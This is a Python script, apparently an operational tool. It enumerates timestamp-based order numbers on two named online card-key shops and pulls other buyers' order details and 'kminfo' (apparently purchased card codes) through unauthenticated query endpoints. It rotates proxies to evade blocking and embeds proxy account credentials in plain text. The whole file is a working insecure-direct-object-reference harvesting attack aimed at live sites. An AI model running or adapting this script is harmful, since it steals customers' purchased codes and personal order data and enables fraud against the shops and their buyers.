#!/usr/bin/env python3
"""近 N 小时每分钟全后缀 000-999 精确扫（修复空响应误判）"""
import json, os, re, subprocess, sys, time
from datetime import datetime, timedelta

ENV = "/data/config/proxy.env"
FETCH = "/data/automation/bin/qg-proxy-fetch.sh"

def main():
    base = sys.argv[1]  # https://qq8.one or https://hmjf.lol/shop
    hours_back = int(sys.argv[2]) if len(sys.argv) > 2 else 8
    name = "qq8" if "qq8" in base else "hmjf"
    out = f"/data/automation/results/{'qq8.one' if name=='qq8' else 'hmjf.lol'}/kami_deep_20260716"
    os.makedirs(out, exist_ok=True)
    ref = base if base.endswith("/") else base + "/"
    ck = f"{out}/.cookies_{name}_fast"
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    logf = open(f"{out}/fast_{name}.log", "a", buffering=1)
    hits = []

    def log(m):
        print(m, flush=True)
        logf.write(m + "\n")

    def px():
        for l in open(ENV):
            if l.startswith("PROXY_URL="):
                return l.split("=", 1)[1].strip().strip('"')
        return ""

    pxv = px()
    n = 0

    def refresh():
        nonlocal pxv
        subprocess.run(["bash", FETCH], capture_output=True,
                       env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
        pxv = px()

    def curl(url, post=None):
        nonlocal n, pxv
        n += 1
        if n % 100 == 0:
            refresh()
        c = ["curl", "-s", "--max-time", "10", "-x", pxv, "-A", ua, "-H", f"Referer: {ref}",
             "-b", ck, "-c", ck, "-k"]
        if post:
            c += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
        c.append(url)
        for _ in range(3):
            raw = subprocess.run(c, capture_output=True, text=True, timeout=14).stdout or ""
            if raw.strip():
                return raw
            refresh()
            time.sleep(0.5)
        return raw

    def exists(tn):
        sub = curl(f"{base}/other/submit.php?type=alipay&orderid={tn}")
        if not sub.strip():
            return None
        if "该订单号不存在" in sub:
            return False
        return True

    def pull(tn):
        gs = curl(f"{base}/other/getshop.php?trade_no={tn}")
        qh = curl(f"{base}/?mod=query&data={tn}")
        qb = curl(f"{base}/ajax.php?act=query", f"type=1&qq={tn}")
        rec = {"tn": tn, "gs": gs[:250], "qb": qb[:250]}
        kminfo = None
        try:
            j = json.loads(gs)
            if j.get("kminfo"):
                kminfo = j["kminfo"]
        except Exception:
            pass
        som = re.search(r"showOrder\s*\(\s*(\d+)\s*,\s*'([a-f0-9]{32})'", qh)
        if som:
            oid, sk = som.groups()
            oh = curl(f"{base}/ajax.php?act=order", f"id={oid}&skey={sk}")
            rec["order"] = oh[:300]
            try:
                oj = json.loads(oh)
                if oj.get("kminfo"):
                    kminfo = oj["kminfo"]
            except Exception:
                pass
        rec["kminfo"] = kminfo
        rec["paid"] = bool(kminfo) or ("未付款" not in gs and "code" in gs)
        hits.append(rec)
        with open(f"{out}/fast_hits_{name}.jsonl", "a") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        tag = "KMINFO" if kminfo else "PAID" if rec["paid"] else "EXIST"
        log(f"*** {tag} {tn} kminfo={bool(kminfo)}")
        return rec

    curl(base)
    now = datetime.now()
    log(f"[start] {base} hours_back={hours_back} from {now.isoformat()}")
    total = 0
    for hb in range(hours_back):
        t = now - timedelta(hours=hb)
        date = t.strftime("%Y%m%d")
        hour = t.hour
        for m in range(60):
            for s in range(0, 60, 5):  # 每5秒一桶
                prefix = f"{date}{hour:02d}{m:02d}{s:02d}"
                bucket = 0
                for suf in range(0, 1000, 10):  # 全后缀步进10（可二次细化）
                    tn = f"{prefix}{suf:03d}"
                    ex = exists(tn)
                    if ex is False:
                        continue
                    if ex is None:
                        continue
                    bucket += 1
                    total += 1
                    pull(tn)
                    time.sleep(0.05)
                if bucket:
                    log(f"  {prefix} bucket_hits={bucket} total={total}")
            if m % 10 == 0:
                log(f"  progress {date} {hour:02d}:{m:02d} total={total} req={n}")
    json.dump(hits, open(f"{out}/fast_{name}_all.json", "w"), ensure_ascii=False, indent=2)
    log(f"[done] total={total} req={n}")
    logf.close()

if __name__ == "__main__":
    main()
